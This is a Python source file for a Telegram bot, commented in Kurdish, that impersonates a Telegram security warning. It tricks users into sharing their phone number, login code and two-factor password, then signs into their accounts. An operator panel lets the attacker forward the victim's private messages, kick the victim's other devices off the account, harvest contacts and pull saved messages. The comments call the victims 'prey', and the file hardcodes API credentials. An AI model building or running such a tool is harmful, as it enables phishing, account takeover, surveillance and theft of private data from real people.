import asyncio
import traceback
from pyrogram import Client, filters, errors
from pyrogram.types import (ReplyKeyboardMarkup, KeyboardButton, 
                            InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove)

# --- زانیارییەکان ---
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
ADMIN_ID = 7414272224

app = Client("pro_spy_ultimate_fix", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# داتابەیسی کاتی
sessions = {}

# --- دروستکردنی دوگمەکانی کۆنترۆڵ ---
def get_control_panel(u_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📡 سیخوڕی (Forward)", callback_data=f"spy_{u_id}")],
        [InlineKeyboardButton("⚔️ دەرکردنی ئامێرەکان", callback_data=f"kick_{u_id}")],
        [InlineKeyboardButton("📇 وەرگرتنی ناوەکان", callback_data=f"cnt_{u_id}"),
         InlineKeyboardButton("📂 ١٠ نامەی کۆتا", callback_data=f"msg_{u_id}")]
    ])

# --- فەرمانی ستارت و پانێڵ ---
@app.on_message(filters.command(["start", "panel"]) & filters.private)
async def start_handler(client, message):
    if message.from_user.id == ADMIN_ID:
        if not sessions:
            await message.reply_text("💎 **بەخێرهاتی گەورەم**\n\nتا ئێستا هیچ کەس لۆگین نەبووە.")
        else:
            await message.reply_text("🎯 **نێچیرە چالاکەکان:**")
            for vid, data in sessions.items():
                if data.get("step") == "done":
                    await message.reply_text(f"👤 نێچیر: `+{data['phone']}`\n🆔: `{vid}`", 
                                           reply_markup=get_control_panel(vid))
        return

    # ڕووکاری نێچیر (پڕۆفیشناڵ)
    kb = ReplyKeyboardMarkup([[KeyboardButton("📲 پشتڕاستکردنەوەی ژمارە", request_contact=True)]], 
                             resize_keyboard=True, one_time_keyboard=True)
    await message.reply_text(
        "⚠️ **ئاگاداری تێلیگرام**\n\nبۆ پاراستنی ئەکاونتەکەت لە بلۆک بوون، پێویستە ناسنامەکەت پشتڕاست بکەیتەوە.\n\nتکایە کلیک لە دوگمەی خوارەوە بکە:",
        reply_markup=kb
    )

# --- قۆناغی وەرگرتنی ژمارە ---
@app.on_message(filters.contact & filters.private)
async def contact_handler(client, message):
    u_id = message.from_user.id
    phone = message.contact.phone_number
    
    await app.send_message(ADMIN_ID, f"☎️ **ژمارەیەکی نوێ هات:** `+{phone}`\nچاوەڕێی کۆد بە...")
    
    # دروستکردنی کلاینت بە ناوی ئامێری فەرمی
    c = Client(f"session_{u_id}", api_id=API_ID, api_hash=API_HASH, device_model="iPhone 15 Pro Max")
    await c.connect()
    
    try:
        sent_code = await c.send_code(phone)
        sessions[u_id] = {
            "client": c, "phone": phone, 
            "hash": sent_code.phone_code_hash, "step": "code"
        }
        await message.reply_text("📩 **کۆدێکی ٥ ژمارەیی بۆ تێلیگرامەکەت هات.**\nتکایە لێرە بینووسە:", 
                               reply_markup=ReplyKeyboardRemove())
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ **هەڵە لە ناردنی کۆد:**\n`{str(e)}`")

# --- قۆناغی لۆگین (چاککراو بۆ Expired Code) ---
@app.on_message(filters.text & filters.private)
async def login_logic(client, message):
    u_id = message.from_user.id
    if u_id not in sessions or sessions[u_id].get("step") == "done" or u_id == ADMIN_ID:
        return

    data = sessions[u_id]
    # تەنها ژمارە وەردەگرین بۆ کۆدەکە
    clean_input = "".join(filter(str.isdigit, message.text)) if data["step"] == "code" else message.text

    try:
        if data["step"] == "code":
            # کەمێک چاوەڕێ دەکەین بۆ ڕێکخستنی کات (گرنگە بۆ سێرڤەر)
            await asyncio.sleep(1)
            await data["client"].sign_in(data["phone"], data["hash"], clean_input)
            
        elif data["step"] == "2fa":
            await data["client"].check_password(clean_input)

        # سەرکەوتوو
        sessions[u_id]["step"] = "done"
        await message.reply_text("✅ سوپاس، ناسنامەکەت بە سەرکەوتوویی پشتڕاستکرایەوە.")
        await app.send_message(ADMIN_ID, f"🔥 **لۆگین سەرکەوتوو بوو!**\n📱 ژمارە: `+{data['phone']}`", 
                               reply_markup=get_control_panel(u_id))

    except errors.SessionPasswordNeeded:
        sessions[u_id]["step"] = "2fa"
        await message.reply_text("🔑 **ئەم ئەکاونتە پاسۆردی دوو قۆناغی (2FA) هەیە.**\nتکایە پاسۆردەکە بنێرە:")
    except errors.PhoneCodeExpired:
        await message.reply_text("❌ **کۆدەکە بەسەرچووە.**\nتکایە دووبارە کلیک لەسەر دوگمەی (پشتڕاستکردنەوە) بکەرەوە.")
        await app.send_message(ADMIN_ID, f"⚠️ کۆدەکەی `+{data['phone']}` بەسەرچوو (Expired).")
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ **هەڵەی لۆگین:**\n`{str(e)}`")

# --- کارپێکردنی دوگمەکانی پانێڵ ---
@app.on_callback_query()
async def buttons(client, query):
    cmd, target_id = query.data.split("_")
    target_id = int(target_id)
    
    if target_id not in sessions:
        await query.answer("❌ ئەم نێچیرە لە بیرەوەری بۆتەکە نەماوە.", show_alert=True)
        return

    u_client = sessions[target_id]["client"]

    try:
        if cmd == "spy":
            @u_client.on_message(filters.private & ~filters.me)
            async def forwarder(c, m):
                await m.forward(ADMIN_ID)
            await query.answer("📡 سیستەمی سیخوڕی چالاک بوو.")
        
        elif cmd == "kick":
            auths = await u_client.get_authorizations()
            for a in auths:
                if not a.is_current: await u_client.terminate_session(a.hash)
            await query.answer("⚔️ هەموو ئامێرەکان دەرکران.", show_alert=True)
            
        elif cmd == "cnt":
            contacts = await u_client.get_contacts()
            res = "\n".join([f"👤 {c.first_name}: +{c.phone_number}" for c in contacts[:15]])
            await app.send_message(ADMIN_ID, f"📇 **لیستی ناوەکان:**\n\n{res}")
            
        elif cmd == "msg":
            async for m in u_client.get_chat_history("me", limit=10):
                await m.forward(ADMIN_ID)
            await query.answer("١٠ نامە فۆروارد کرا.")
            
    except Exception as e:
        await query.answer(f"⚠️ هەڵە: {str(e)}", show_alert=True)

print("--- BOT IS RUNNING PRO ---")
app.run()
